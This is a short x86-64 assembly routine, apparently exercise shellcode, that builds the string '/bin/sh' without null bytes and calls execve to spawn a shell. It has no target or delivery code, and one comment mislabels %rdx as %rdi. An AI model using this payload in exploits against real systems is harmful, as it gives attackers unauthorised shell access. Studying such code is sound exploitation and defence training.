.globl main	
main:	
	movabsq $0x68732f6e69622f20, %rax # " /bin/sh"
	shr $8,%rax		# shr to "/bin/sh\0"
	pushq %rax		
	movq %rsp, %rdi	        # %rdi <- "/bin/sh"
	xorq %rax,%rax		# %rax <- 0
	pushq %rax
	pushq %rdi
	movq %rsp, %rsi		# %rsi <- argv (singleton array containing "/bin/sh")
	movq %rax, %rdx		# %rdi <- envp (empty)
	addq $0x3b, %rax	# %rax <- __NR_execve
	syscall
	